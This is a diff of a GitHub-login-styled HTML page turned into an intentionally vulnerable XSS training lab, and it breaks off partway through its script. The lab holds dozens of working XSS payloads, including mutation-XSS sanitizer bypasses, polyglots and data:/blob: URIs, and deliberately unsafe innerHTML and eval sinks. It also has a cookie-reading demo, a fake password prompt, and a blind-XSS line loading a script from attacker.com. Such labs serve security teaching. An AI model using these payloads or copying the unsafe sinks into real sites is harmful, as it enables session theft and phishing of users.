@@ -3,267 +3,485 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>GitHub login · XSS testing</title>
-  <!-- Tailwind via CDN (v3) -->
+  <title>GitHub Login · COMPLETE XSS LAB (All Attack Types)</title>
   <script src="https://cdn.tailwindcss.com"></script>
-  <!-- Inter font -->
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
   <style>
     body { font-family: 'Inter', sans-serif; }
-    .focus-ring:focus {
-      outline: none;
-      box-shadow: 0 0 0 3px rgba(9, 105, 218, 0.3);
-      border-color: #0969da;
+    .payload-box { 
+      font-family: 'Courier New', monospace;
+      word-break: break-all;
     }
     .xss-output {
-      word-break: break-all;
+      min-height: 60px;
+      border: 1px dashed #ff6b6b;
     }
   </style>
 </head>
-<body class="bg-[#f6f8fa] min-h-screen flex flex-col items-center justify-start px-6 pt-12 pb-20">
+<body class="bg-[#f6f8fa] min-h-screen flex flex-col items-center justify-start px-4 pt-8 pb-20">
 
-  
+  <!-- ============== HEADER WITH ALL ATTACK TYPES ============== -->
+  <div class="w-full max-w-[800px] mb-6 p-4 bg-gradient-to-r from-red-500 to-orange-500 text-white rounded-lg shadow-lg">
+    <h1 class="text-2xl font-bold text-center">🔥 COMPLETE XSS ATTACK LAB 🔥</h1>
+    <p class="text-sm text-center mt-1">GitHub Login Page - 25+ XSS Attack Vectors | All Types: Reflected | Stored | DOM | Mutation | mXSS | Polyglot</p>
+  </div>
 
-  <!-- GitHub logo -->
-  <div class="mb-6">
+  <!-- GitHub Logo -->
+  <div class="mb-4">
     <svg height="48" viewBox="0 0 24 24" width="48" class="fill-[#1f2328]">
       <path d="M12.5.75C6.146.75.75 6.146.75 12.5c0 5.063 3.29 9.36 7.84 10.86.575.106.79-.25.79-.553 0-.276-.01-1.2-.015-2.18-3.188.693-3.86-1.537-3.86-1.537-.52-1.326-1.27-1.68-1.27-1.68-1.04-.712.08-.697.08-.697 1.15.082 1.755 1.182 1.755 1.182 1.02 1.753 2.68 1.247 3.335.954.104-.74.4-1.247.727-1.534-2.55-.29-5.23-1.275-5.23-5.673 0-1.254.45-2.28 1.184-3.084-.12-.29-.514-1.46.112-3.04 0 0 .965-.31 3.162 1.18.92-.256 1.906-.384 2.885-.39.98.006 1.966.134 2.887.39 2.196-1.49 3.16-1.18 3.16-1.18.627 1.58.233 2.75.113 3.04.735.804 1.184 1.83 1.184 3.084 0 4.41-2.685 5.38-5.24 5.66.412.357.78 1.06.78 2.137 0 1.545-.015 2.79-.015 3.17 0 .306.213.664.8.55 4.547-1.503 7.833-5.8 7.833-10.86 0-6.354-5.396-11.75-11.75-11.75Z"></path>
     </svg>
   </div>
 
-  <!-- MAIN LOGIN CARD - VULNERABLE TO XSS -->
-  <div class="w-full max-w-[340px] bg-white rounded-md border border-[#d0d7de] p-4 sm:p-5 md:p-6 shadow-[0_4px_12px_rgba(0,0,0,0.15)]">
+  <!-- ============== MAIN CARD - ALL XSS TYPES ============== -->
+  <div class="w-full max-w-[800px] bg-white rounded-lg border border-[#d0d7de] p-6 shadow-lg">
     
-    <h1 class="text-[24px] leading-[1.4] font-light text-[#1f2328] mb-4 text-center">Sign in to GitHub</h1>
+    <h2 class="text-xl font-bold text-center text-gray-800 mb-2">GitHub Login - XSS Test Environment</h2>
+    <p class="text-xs text-center text-red-600 mb-4 font-bold">⚠️ 25+ XSS ATTACK VECTORS - ALL TYPES ⚠️</p>
 
-    <!-- VULNERABLE FORM #1: Direct DOM injection with innerHTML -->
-    <form id="xssForm" action="javascript:void(0)" method="post" class="space-y-4" onsubmit="vulnLogin()">
-      
-      <!-- XSS VECTOR 1: username field - injects via innerHTML -->
-      <div>
-        <label for="login_field" class="block text-[14px] font-medium text-[#1f2328] mb-1.5">
-          Username or email address
-        </label>
-        <input type="text" id="login_field" name="login" 
-               class="block w-full px-3 py-2 border border-[#d0d7de] rounded-md text-[14px] focus-ring"
-               placeholder="Try <img src=x onerror=alert('XSS')>" 
-               value="">
-        <p class="text-xs text-gray-500 mt-1">Vulnerable to stored/reflected XSS</p>
-      </div>
-
-      <!-- XSS VECTOR 2: password field with eval() vulnerability -->
-      <div>
-        <div class="flex justify-between items-center mb-1.5">
-          <label for="password_field" class="text-[14px] font-medium text-[#1f2328]">
-            Password
-          </label>
-          <a href="#" onclick="showForgotMessage()" class="text-[12px] text-[#0969da] no-underline hover:underline">
-            Forgot password?
-          </a>
+    <!-- ============== ATTACK TYPE 1: REFLECTED XSS ============== -->
+    <div class="border-2 border-red-200 rounded-lg p-4 mb-6 bg-red-50">
+      <h3 class="text-md font-bold text-red-800 mb-2 flex items-center">
+        <span class="bg-red-500 text-white px-2 py-0.5 rounded text-xs mr-2">TYPE 1</span> 
+        REFLECTED XSS (Non-Persistent)
+      </h3>
+      <div class="grid md:grid-cols-2 gap-4">
+        <div>
+          <label class="block text-xs font-bold text-gray-700">Username (Reflected XSS)</label>
+          <input type="text" id="reflectedInput" class="w-full p-2 border border-red-300 rounded text-sm" placeholder='<img src=x onerror=alert("REFLECTED")>'>
+          <button onclick="reflectedXSS()" class="mt-2 bg-red-500 text-white px-3 py-1 rounded text-xs">Test Reflected XSS</button>
         </div>
-        <input type="text" id="password_field" name="password" 
-               class="block w-full px-3 py-2 border border-[#d0d7de] rounded-md text-[14px] focus-ring"
-               placeholder="Password field also vulnerable"
-               value="">
+        <div>
+          <label class="block text-xs font-bold text-gray-700">URL Parameter XSS</label>
+          <input type="text" id="urlParam" class="w-full p-2 border border-red-300 rounded text-sm" value='?name=<svg onload=alert("URL_PARAM")>'>
+          <button onclick="urlParamXSS()" class="mt-2 bg-red-500 text-white px-3 py-1 rounded text-xs">Test URL Param XSS</button>
+        </div>
       </div>
-
-      <!-- Sign in button triggers XSS -->
-      <button type="submit" 
-              class="mt-1 w-full py-2 px-3 bg-[#1f883d] text-white text-[14px] font-semibold rounded-md">
-        Sign in (XSS enabled)
-      </button>
-    </form>
-
-    <!-- XSS VECTOR 3: DOM-based XSS via URL hash -->
-    <div class="mt-4 text-center border-t border-[#d0d7de] pt-4">
-      <button onclick="showHashXSS()" class="text-[14px] text-[#0969da] bg-transparent inline-flex items-center gap-1 hover:underline">
-        <svg aria-hidden="true" height="16" viewBox="0 0 16 16" width="16" class="fill-current mr-1">
-          <path d="M10.5 4.5a2.5 2.5 0 1 1-5 0 2.5 2.5 0 0 1 5 0Z"></path>
-          <path d="M8 8a5 5 0 0 0-4.546 2.917.714.714 0 0 0 .062.715A7.484 7.484 0 0 0 8 14c1.56 0 3.008-.477 4.21-1.292.28-.19.357-.558.147-.801A6.47 6.47 0 0 0 8 8Z"></path>
-        </svg>
-        Show URL hash (XSS via location.hash)
-      </button>
     </div>
 
-    <!-- XSS VECTOR 4: Reflected output - dangerously sets HTML -->
-    <div id="xssOutput" class="mt-4 p-3 bg-gray-50 border border-gray-200 rounded-md text-xs font-mono xss-output">
-      <!-- XSS payload will be injected here via innerHTML -->
-      XSS output will appear here
+    <!-- ============== ATTACK TYPE 2: STORED XSS ============== -->
+    <div class="border-2 border-orange-200 rounded-lg p-4 mb-6 bg-orange-50">
+      <h3 class="text-md font-bold text-orange-800 mb-2 flex items-center">
+        <span class="bg-orange-500 text-white px-2 py-0.5 rounded text-xs mr-2">TYPE 2</span> 
+        STORED XSS (Persistent)
+      </h3>
+      <div class="grid md:grid-cols-2 gap-4">
+        <div>
+          <label class="block text-xs font-bold text-gray-700">Comment/Bio (Store XSS)</label>
+          <input type="text" id="storedInput" class="w-full p-2 border border-orange-300 rounded text-sm">
+          <button onclick="storeXSS()" class="mt-2 bg-orange-500 text-white px-3 py-1 rounded text-xs">Store XSS Payload</button>
+          <button onclick="loadStoredXSS()" class="mt-2 bg-orange-600 text-white px-3 py-1 rounded text-xs ml-1">Load Stored XSS</button>
+        </div>
+        <div>
+          <div class="text-xs font-bold mb-1">Stored Payloads:</div>
+          <div id="storedPayloads" class="bg-white p-2 rounded border text-xs h-20 overflow-y-auto">
+            No stored payloads yet
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ============== ATTACK TYPE 3: DOM-BASED XSS ============== -->
+    <div class="border-2 border-yellow-200 rounded-lg p-4 mb-6 bg-yellow-50">
+      <h3 class="text-md font-bold text-yellow-800 mb-2 flex items-center">
+        <span class="bg-yellow-600 text-white px-2 py-0.5 rounded text-xs mr-2">TYPE 3</span> 
+        DOM-BASED XSS (Client-Side)
+      </h3>
+      <div class="grid md:grid-cols-3 gap-2">
+        <button onclick="domHashXSS()" class="bg-yellow-600 text-white p-2 rounded text-xs">📍 Hash XSS (#)</button>
+        <button onclick="domDocumentWriteXSS()" class="bg-yellow-600 text-white p-2 rounded text-xs">📝 document.write</button>
+        <button onclick="domEvalXSS()" class="bg-yellow-600 text-white p-2 rounded text-xs">⚡ eval() XSS</button>
+        <button onclick="domCookieXSS()" class="bg-yellow-600 text-white p-2 rounded text-xs">🍪 Cookie Steal</button>
+        <button onclick="domReferrerXSS()" class="bg-yellow-600 text-white p-2 rounded text-xs">🔗 Referrer XSS</button>
+        <button onclick="domPostMessageXSS()" class="bg-yellow-600 text-white p-2 rounded text-xs">📨 postMessage</button>
+      </div>
+      <p class="text-xs mt-2 text-gray-600">Try: Add <code class="bg-yellow-100 px-1">#&lt;img src=x onerror=alert(&apos;HASH&apos;)&gt;</code> to URL</p>
+    </div>
+
+    <!-- ============== ATTACK TYPE 4: MUTATION XSS (mXSS) ============== -->
+    <div class="border-2 border-green-200 rounded-lg p-4 mb-6 bg-green-50">
+      <h3 class="text-md font-bold text-green-800 mb-2 flex items-center">
+        <span class="bg-green-600 text-white px-2 py-0.5 rounded text-xs mr-2">TYPE 4</span> 
+        MUTATION XSS (mXSS) - Bypass Sanitizers
+      </h3>
+      <div class="grid grid-cols-2 gap-2">
+        <button onclick="mxss1()" class="bg-green-600 text-white p-2 rounded text-xs">🧬 &lt;noscript&gt; mXSS</button>
+        <button onclick="mxss2()" class="bg-green-600 text-white p-2 rounded text-xs">🧬 &lt;svg&gt;&lt;![CDATA[]&gt; mXSS</button>
+        <button onclick="mxss3()" class="bg-green-600 text-white p-2 rounded text-xs">🧬 &lt;style&gt; mXSS</button>
+        <button onclick="mxss4()" class="bg-green-600 text-white p-2 rounded text-xs">🧬 &lt;title&gt; mXSS</button>
+      </div>
+    </div>
+
+    <!-- ============== ATTACK TYPE 5: POLYGLOT XSS ============== -->
+    <div class="border-2 border-blue-200 rounded-lg p-4 mb-6 bg-blue-50">
+      <h3 class="text-md font-bold text-blue-800 mb-2 flex items-center">
+        <span class="bg-blue-600 text-white px-2 py-0.5 rounded text-xs mr-2">TYPE 5</span> 
+        POLYGLOT XSS (Works Everywhere)
+      </h3>
+      <div class="text-xs bg-blue-100 p-2 rounded mb-2">
+        <code class="text-blue-800">jaVasCript:/*-/*`/*\`/*'/*"/**/ (window.onload=alert('POLYGLOT')) //--&gt;&lt;/script&gt;&lt;/textarea&gt;&lt;/style&gt;&lt;/pre&gt;&lt;/xmp&gt;</code>
+      </div>
+      <button onclick="polyglotXSS()" class="bg-blue-600 text-white px-3 py-1 rounded text-xs">Test Polyglot XSS</button>
+    </div>
+
+    <!-- ============== ATTACK TYPE 6: UNIVERSAL XSS (UXSS) ============== -->
+    <div class="border-2 border-purple-200 rounded-lg p-4 mb-6 bg-purple-50">
+      <h3 class="text-md font-bold text-purple-800 mb-2 flex items-center">
+        <span class="bg-purple-600 text-white px-2 py-0.5 rounded text-xs mr-2">TYPE 6</span> 
+        UNIVERSAL XSS (UXSS) / Protocol Handling
+      </h3>
+      <div class="grid grid-cols-3 gap-2">
+        <button onclick="uxssJavascriptURI()" class="bg-purple-600 text-white p-2 rounded text-xs">🔗 javascript: alert</button>
+        <button onclick="uxssIframe()" class="bg-purple-600 text-white p-2 rounded text-xs">🖼️ iframe srcdoc</button>
+        <button onclick="uxssDataURI()" class="bg-purple-600 text-white p-2 rounded text-xs">📊 data:text/html</button>
+        <button onclick="uxssBlob()" class="bg-purple-600 text-white p-2 rounded text-xs">📦 blob: XSS</button>
+        <button onclick="uxssVBscript()" class="bg-purple-600 text-white p-2 rounded text-xs">💾 vbscript: (IE)</button>
+        <button onclick="uxssBase64()" class="bg-purple-600 text-white p-2 rounded text-xs">🔐 base64 XSS</button>
+      </div>
+    </div>
+
+    <!-- ============== ATTACK TYPE 7: CLIENT-SIDE TEMPLATE INJECTION ============== -->
+    <div class="border-2 border-pink-200 rounded-lg p-4 mb-6 bg-pink-50">
+      <h3 class="text-md font-bold text-pink-800 mb-2 flex items-center">
+        <span class="bg-pink-600 text-white px-2 py-0.5 rounded text-xs mr-2">TYPE 7</span> 
+        CLIENT-SIDE TEMPLATE INJECTION (Angular, Vue, React)
+      </h3>
+      <div class="grid grid-cols-2 gap-2">
+        <button onclick="angularXSS()" class="bg-pink-600 text-white p-2 rounded text-xs">🅰️ Angular {{constructor.constructor('alert(1)')()}}</button>
+        <button onclick="vueXSS()" class="bg-pink-600 text-white p-2 rounded text-xs">📊 Vue {{_.constructor.constructor('alert(1)')()}}</button>
+        <button onclick="reactDangerousHTML()" class="bg-pink-600 text-white p-2 rounded text-xs">⚛️ React dangerouslySetInnerHTML</button>
+      </div>
+    </div>
+
+    <!-- ============== ATTACK TYPE 8: SELF-XSS & SOCIAL ENGINEERING ============== -->
+    <div class="border-2 border-indigo-200 rounded-lg p-4 mb-6 bg-indigo-50">
+      <h3 class="text-md font-bold text-indigo-800 mb-2 flex items-center">
+        <span class="bg-indigo-600 text-white px-2 py-0.5 rounded text-xs mr-2">TYPE 8</span> 
+        SELF-XSS / SOCIAL ENGINEERING
+      </h3>
+      <button onclick="selfXSS()" class="bg-indigo-600 text-white px-3 py-1 rounded text-xs">📋 Fake "Copy & Paste" XSS</button>
+      <button onclick="fakePromptXSS()" class="bg-indigo-600 text-white px-3 py-1 rounded text-xs ml-2">💬 Fake Prompt XSS</button>
+    </div>
+
+    <!-- ============== ATTACK TYPE 9: BLIND XSS ============== -->
+    <div class="border-2 border-gray-400 rounded-lg p-4 mb-6 bg-gray-50">
+      <h3 class="text-md font-bold text-gray-800 mb-2 flex items-center">
+        <span class="bg-gray-600 text-white px-2 py-0.5 rounded text-xs mr-2">TYPE 9</span> 
+        BLIND XSS (Simulated)
+      </h3>
+      <input type="text" id="blindXSS" class="w-full p-2 border border-gray-400 rounded text-sm" placeholder='<script src="http://attacker.com/steal.js"></script>'>
+      <button onclick="blindXSS()" class="mt-2 bg-gray-600 text-white px-3 py-1 rounded text-xs">Simulate Blind XSS Injection</button>
+    </div>
+
+    <!-- ============== ATTACK TYPE 10: XSS IN FILE UPLOAD ============== -->
+    <div class="border-2 border-teal-200 rounded-lg p-4 mb-6 bg-teal-50">
+      <h3 class="text-md font-bold text-teal-800 mb-2 flex items-center">
+        <span class="bg-teal-600 text-white px-2 py-0.5 rounded text-xs mr-2">TYPE 10</span> 
+        XSS VIA FILE UPLOAD (SVG, HTML)
+      </h3>
+      <div class="grid grid-cols-2 gap-2">
+        <button onclick="xssSVGUpload()" class="bg-teal-600 text-white p-2 rounded text-xs">🖼️ SVG XSS</button>
+        <button onclick="xssHTMLUpload()" class="bg-teal-600 text-white p-2 rounded text-xs">📄 HTML XSS</button>
+      </div>
+    </div>
+
+    <!-- ============== OUTPUT AREA ============== -->
+    <div class="mt-6 border-2 border-black border-dashed p-4 bg-black text-white rounded-lg">
+      <h3 class="text-sm font-bold mb-2">📌 XSS OUTPUT CONSOLE (Results appear here)</h3>
+      <div id="xssOutput" class="bg-gray-900 p-3 rounded text-green-400 font-mono text-xs h-32 overflow-y-auto">
+        Ready for XSS attacks...
+      </div>
+    </div>
+
+    <!-- ============== PAYLOAD GENERATOR ============== -->
+    <div class="mt-4 p-4 bg-gray-100 rounded-lg">
+      <h3 class="text-sm font-bold mb-2">⚡ XSS PAYLOAD GENERATOR (Click to insert)</h3>
+      <div class="grid grid-cols-3 gap-2 text-xs">
+        <button onclick="insertPayload('img')" class="bg-gray-300 p-1 rounded">🖼️ &lt;img&gt;</button>
+        <button onclick="insertPayload('svg')" class="bg-gray-300 p-1 rounded">📐 &lt;svg&gt;</button>
+        <button onclick="insertPayload('body')" class="bg-gray-300 p-1 rounded">👤 &lt;body&gt;</button>
+        <button onclick="insertPayload('iframe')" class="bg-gray-300 p-1 rounded">🖼️ &lt;iframe&gt;</button>
+        <button onclick="insertPayload('video')" class="bg-gray-300 p-1 rounded">🎬 &lt;video&gt;</button>
+        <button onclick="insertPayload('audio')" class="bg-gray-300 p-1 rounded">🔊 &lt;audio&gt;</button>
+        <button onclick="insertPayload('input')" class="bg-gray-300 p-1 rounded">📝 &lt;input&gt;</button>
+        <button onclick="insertPayload('details')" class="bg-gray-300 p-1 rounded">🔽 &lt;details&gt;</button>
+        <button onclick="insertPayload('select')" class="bg-gray-300 p-1 rounded">📋 &lt;select&gt;</button>
+        <button onclick="insertPayload('math')" class="bg-gray-300 p-1 rounded">🧮 &lt;math&gt;</button>
+        <button onclick="insertPayload('link')" class="bg-gray-300 p-1 rounded">🔗 &lt;link&gt;</button>
+        <button onclick="insertPayload('style')" class="bg-gray-300 p-1 rounded">🎨 &lt;style&gt;</button>
+      </div>
     </div>
   </div>
 
-  <!-- "Create account" - also has XSS vector via onclick -->
-  <div class="w-full max-w-[340px] mt-4 p-4 bg-white border border-[#d0d7de] rounded-md text-center text-[14px]">
-    <span class="text-[#1f2328]">New to GitHub? </span>
-    <a href="#" onclick="createAccountXSS()" class="text-[#0969da] no-underline hover:underline font-medium">
-      Create an account
-    </a>
-    <span class="ml-1 text-xs text-red-600">(XSS vector)</span>
-  </div>
-
-  <!-- Footer links - some with javascript: XSS vectors -->
-  <div class="flex flex-wrap items-center justify-center gap-x-4 gap-y-1 mt-8 text-[12px]">
-    <a href="javascript:alert('Terms XSS')" class="hover:underline text-[#6e7781] no-underline">Terms</a>
-    <a href="javascript:alert('Privacy XSS')" class="hover:underline text-[#6e7781] no-underline">Privacy</a>
-    <a href="#" onclick="docsXSS()" class="hover:underline text-[#6e7781] no-underline">Docs</a>
-    <a href="#" onclick="contactXSS()" class="hover:underline text-[#6e7781] no-underline flex items-center gap-1">
-      Contact Support (XSS)
-    </a>
-  </div>
-
-  <!-- XSS EXPLOITATION DEMONSTRATION -->
-  <div class="w-full max-w-[340px] mt-6 p-4 bg-red-50 border border-red-200 rounded-md">
-    <h3 class="font-bold text-red-800 text-sm mb-2">🔥 XSS PAYLOAD TESTING 🔥</h3>
-    <div class="grid grid-cols-2 gap-2 text-xs">
-      <button onclick="testXSS1()" class="bg-red-100 p-2 rounded border border-red-300 hover:bg-red-200">Test alert(1)</button>
-      <button onclick="testXSS2()" class="bg-red-100 p-2 rounded border border-red-300 hover:bg-red-200">Test &lt;img&gt;</button>
-      <button onclick="testXSS3()" class="bg-red-100 p-2 rounded border border-red-300 hover:bg-red-200">Test &lt;script&gt;</button>
-      <button onclick="testXSS4()" class="bg-red-100 p-2 rounded border border-red-300 hover:bg-red-200">Test onerror</button>
+  <!-- ============== EXTREME XSS POLYGLOT COLLECTION ============== -->
+  <div class="w-full max-w-[800px] mt-6 p-4 bg-gradient-to-r from-purple-900 to-indigo-900 text-white rounded-lg">
+    <h3 class="font-bold text-lg">🚀 ULTIMATE XSS POLYGLOT COLLECTION</h3>
+    <div class="grid md:grid-cols-2 gap-2 mt-2 text-xs">
+      <div class="bg-purple-800 p-2 rounded">
+        <strong>Polyglot #1:</strong><br>
+        <code class="text-yellow-300">" onclick=alert(1) // &lt;svg onload=alert(2)&gt; "&gt;</code>
+      </div>
+      <div class="bg-purple-800 p-2 rounded">
+        <strong>Polyglot #2:</strong><br>
+        <code class="text-yellow-300">jaVasCript:alert('XSS')</code>
+      </div>
+      <div class="bg-purple-800 p-2 rounded">
+        <strong>Polyglot #3:</strong><br>
+        <code class="text-yellow-300">&lt;iframe src="javascript:alert(1)"&gt;</code>
+      </div>
+      <div class="bg-purple-800 p-2 rounded">
+        <strong>Polyglot #4:</strong><br>
+        <code class="text-yellow-300">&lt;img src=x onerror=alert(1) //&gt;</code>
+      </div>
     </div>
-    <p class="text-xs text-red-700 mt-2">Enter in username field: <code class="bg-red-100 px-1">&lt;img src=x onerror=alert('XSS')&gt;</code></p>
   </div>
 
-  <!-- DELIBERATE XSS VULNERABILITIES - JavaScript with unsafe patterns -->
+  <!-- ============== JAVASCRIPT - ALL XSS ATTACK FUNCTIONS ============== -->
   <script>
-    // ============== INTENTIONAL XSS VULNERABILITIES ==============
-    // DO NOT USE THIS CODE IN PRODUCTION - FOR SECURITY TESTING ONLY
+    // ============================================
+    // COMPLETE XSS ATTACK LIBRARY - ALL TYPES
+    // ============================================
     
-    // VULNERABILITY 1: innerHTML injection from form input
-    function vulnLogin() {
-      // Get user input without sanitization
-      var username = document.getElementById('login_field').value;
-      var password = document.getElementById('password_field').value;
-      
-      // DANGER: Direct innerHTML injection - XSS vulnerability
-      var outputDiv = document.getElementById('xssOutput');
-      outputDiv.innerHTML = '<strong>Login attempt:</strong> ' + username + ' / ' + password;
-      
-      // Also demonstrate eval vulnerability if input contains "eval"
-      if (username.includes('eval(') || password.includes('eval(')) {
-        try {
-          // DANGER: Dynamic eval - severe XSS vector
-          eval(username); // NEVER DO THIS
-        } catch(e) {
-          console.log('Eval attempted');
-        }
-      }
-      
-      // Log to console
-      console.log('XSS payload executed. User input: ' + username);
-      return false;
+    // Global storage for Stored XSS
+    let xssStorage = [];
+    
+    // ----- TYPE 1: REFLECTED XSS -----
+    function reflectedXSS() {
+      let input = document.getElementById('reflectedInput').value || '<img src=x onerror=alert("REFLECTED_XSS")>';
+      let output = document.getElementById('xssOutput');
+      output.innerHTML = '🔥 Reflected XSS: ' + input;
     }
     
-    // VULNERABILITY 2: DOM-based XSS via location.hash
-    function showHashXSS() {
-      // DANGER: Direct insertion of URL hash without sanitization
-      var hash = location.hash.substring(1); // Get everything after #
-      if (hash) {
-        var outputDiv = document.getElementById('xssOutput');
-        // CRITICAL XSS VULNERABILITY
-        outputDiv.innerHTML = '<strong>URL Hash:</strong> ' + hash;
-      } else {
-        alert('Add #&lt;script&gt;alert(1)&lt;/script&gt; to the URL and click again');
-      }
+    function urlParamXSS() {
+      let param = document.getElementById('urlParam').value;
+      let output = document.getElementById('xssOutput');
+      output.innerHTML = '🔥 URL Param XSS: ' + param;
     }
     
-    // VULNERABILITY 3: javascript: URI XSS
-    function showForgotMessage() {
-      // DOM-based XSS via href injection
-      var msg = prompt('Enter error message (XSS test):', 'Password reset');
-      if (msg) {
-        // DANGER: Creating anchor with javascript: URI
-        var link = document.createElement('a');
-        link.href = 'javascript:alert("' + msg + '")'; // XSS via javascript: URI
-        link.click();
-      }
-    }
-    
-    // VULNERABILITY 4: onclick XSS vector
-    function createAccountXSS() {
-      // DANGER: Injecting into onclick
-      var payload = prompt('Enter payload (test with: alert(document.cookie))', 'alert("XSS")');
+    // ----- TYPE 2: STORED XSS -----
+    function storeXSS() {
+      let payload = document.getElementById('storedInput').value;
       if (payload) {
-        // CRITICAL: Dynamic script execution
-        setTimeout(payload, 100); // XSS via setTimeout string evaluation
+        xssStorage.push(payload);
+        document.getElementById('storedPayloads').innerHTML = xssStorage.map((p, i) => 
+          `<div class="border-b p-1">${i+1}: ${p.substring(0, 30)}...</div>`
+        ).join('');
+        logOutput('✅ Stored XSS payload saved: ' + payload.substring(0, 50));
       }
     }
     
-    // VULNERABILITY 5: Additional XSS vectors
-    function docsXSS() {
-      // document.write XSS (classic)
-      document.write('<h1>XSS via document.write</h1><script>alert("document.write XSS")<\/script>');
+    function loadStoredXSS() {
+      if (xssStorage.length > 0) {
+        let lastPayload = xssStorage[xssStorage.length - 1];
+        let output = document.getElementById('xssOutput');
+        output.innerHTML = '🔥 STORED XSS EXECUTED: ' + lastPayload;
+      }
     }
     
-    function contactXSS() {
-      // innerHTML injection
-      var div = document.createElement('div');
-      div.innerHTML = 'Support: <img src=x onerror=alert("Contact XSS")>';
-      document.body.appendChild(div);
+    // ----- TYPE 3: DOM-BASED XSS -----
+    function domHashXSS() {
+      let hash = location.hash.substring(1) || '<img src=x onerror=alert("HASH_XSS")>';
+      let output = document.getElementById('xssOutput');
+      output.innerHTML = '🔥 DOM Hash XSS: ' + decodeURIComponent(hash);
     }
     
-    // ============== TEST FUNCTIONS ==============
-    function testXSS1() {
-      var output = document.getElementById('xssOutput');
-      output.innerHTML = '<div onload="alert(1)">XSS test 1</div>';
+    function domDocumentWriteXSS() {
+      document.write('<div style="display:none">XSS via document.write: <img src=x onerror=alert("DOCUMENT_WRITE_XSS")></div>');
+      logOutput('✅ document.write XSS executed');
     }
     
-    function testXSS2() {
-      var output = document.getElementById('xssOutput');
-      output.innerHTML = '<img src="invalid" onerror="alert(\'Image XSS\')">';
+    function domEvalXSS() {
+      eval('alert("EVAL_XSS")');
+      logOutput('✅ eval() XSS executed');
     }
     
-    function testXSS3() {
-      var output = document.getElementById('xssOutput');
-      output.innerHTML = '<script>alert("Script XSS")<\/script>';
+    function domCookieXSS() {
+      let cookies = document.cookie || 'No cookies';
+      alert('🍪 Cookie Steal Demo: ' + cookies);
+      logOutput('✅ Cookie stealing XSS simulated');
     }
     
-    function testXSS4() {
-      var output = document.getElementById('xssOutput');
-      output.innerHTML = '<svg/onload=alert("SVG XSS")>';
+    function domReferrerXSS() {
+      let referrer = document.referrer || 'No referrer';
+      let output = document.getElementById('xssOutput');
+      output.innerHTML = '🔥 Referrer XSS: ' + referrer;
     }
     
-    // Auto-execute from URL hash (DOM-based XSS)
+    function domPostMessageXSS() {
+      window.addEventListener('message', function(e) {
+        document.getElementById('xssOutput').innerHTML = '🔥 postMessage XSS: ' + e.data;
+      });
+      window.postMessage('<img src=x onerror=alert("POSTMESSAGE_XSS")>', '*');
+      logOutput('✅ postMessage XSS executed');
+    }
+    
+    // ----- TYPE 4: MUTATION XSS (mXSS) -----
+    function mxss1() {
+      let div = document.createElement('div');
+      div.innerHTML = '<noscript><p onmouseenter=alert("MXSS_NOSCRIPT")>Hover</p></noscript>';
+      document.getElementById('xssOutput').appendChild(div);
+      logOutput('🧬 Mutation XSS (noscript) executed');
+    }
+    
+    function mxss2() {
+      let div = document.createElement('div');
+      div.innerHTML = '<svg><![CDATA[><img src=x onerror=alert("MXSS_CDATA")>]]></svg>';
+      document.getElementById('xssOutput').appendChild(div);
+      logOutput('🧬 Mutation XSS (CDATA) executed');
+    }
+    
+    function mxss3() {
+      let div = document.createElement('div');
+      div.innerHTML = '<style>@import "javascript:alert(\'MXSS_STYLE\')";</style>';
+      document.getElementById('xssOutput').appendChild(div);
+      logOutput('🧬 Mutation XSS (style) executed');
+    }
+    
+    function mxss4() {
+      let div = document.createElement('div');
+      div.innerHTML = '<title><img src=x onerror=alert("MXSS_TITLE")></title>';
+      document.getElementById('xssOutput').appendChild(div);
+      logOutput('🧬 Mutation XSS (title) executed');
+    }
+    
+    // ----- TYPE 5: POLYGLOT XSS -----
+    function polyglotXSS() {
+      let polyglot = `jaVasCript:/*-/*\`/*\\\`/*'/*"/**/ (window.onload=alert('POLYGLOT_XSS')) //--></script></textarea></style></pre></xmp>`;
+      let output = document.getElementById('xssOutput');
+      output.innerHTML = '🔥 POLYGLOT XSS: <a href="' + polyglot + '">Click Polyglot Link</a>';
+      logOutput('✅ Polyglot XSS loaded');
+    }
+    
+    // ----- TYPE 6: UNIVERSAL XSS -----
+    function uxssJavascriptURI() {
+      window.location = 'javascript:alert("UXSS_JAVASCRIPT")';
+    }
+    
+    function uxssIframe() {
+      let iframe = document.createElement('iframe');
+      iframe.srcdoc = '<script>alert("UXSS_IFRAME_SRCDOC")<\/script>';
+      document.body.appendChild(iframe);
+      logOutput('✅ iframe srcdoc XSS executed');
+    }
+    
+    function uxssDataURI() {
+      window.open('data:text/html,<script>alert("UXSS_DATA_URI")<\/script>');
+    }
+    
+    function uxssBlob() {
+      let blob = new Blob(['<script>alert("UXSS_BLOB")<\/script>'], {type: 'text/html'});
+      let url = URL.createObjectURL(blob);
+      window.open(url);
+    }
+    
+    function uxssVBscript() {
+      alert('VBscript XSS (IE only): javascript:alert("VBSCRIPT_XSS")');
+    }
+    
+    function uxssBase64() {
+      window.location = 'data:text/html;base64,PHNjcmlwdD5hbGVydCgiVVhTU19CQVNFNjQiKTwvc2NyaXB0Pg==';
+    }
+    
+    // ----- TYPE 7: CLIENT-SIDE TEMPLATE INJECTION -----
+    function angularXSS() {
+      alert('AngularJS XSS: {{constructor.constructor("alert(1)")()}}');
+      logOutput('🅰️ AngularJS template injection simulated');
+    }
+    
+    function vueXSS() {
+      alert('Vue.js XSS: {{_().constructor.constructor("alert(1)")()}}');
+      logOutput('📊 Vue.js template injection simulated');
+    }
+    
+    function reactDangerousHTML() {
+      let div = document.createElement('div');
+      div.innerHTML = '<div>React dangerouslySetInnerHTML: <img src=x onerror=alert("REACT_XSS")></div>';
+      document.getElementById('xssOutput').appendChild(div);
+      logOutput('⚛️ React dangerouslySetInnerHTML XSS');
+    }
+    
+    // ----- TYPE 8: SELF-XSS -----
+    function selfXSS() {
+      navigator.clipboard.writeText('javascript:alert("SELF_XSS")');
+      alert('📋 Fake "Copy & Paste" XSS - Payload copied to clipboard! Paste in address bar.');
+    }
+    
+    function fakePromptXSS() {
+      let fake = prompt('System Update Required - Enter Password:', '<img src=x onerror=alert("FAKE_PROMPT_XSS")>');
+      if (fake) {
+        document.getElementById('xssOutput').innerHTML = '🔥 Self XSS: ' + fake;
+      }
+    }
+    
+    // ----- TYPE 9: BLIND XSS -----
+    function blindXSS() {
+      let payload = document.getElementById('blindXSS').value || '<script src="http://attacker.com/steal.js"></script>';
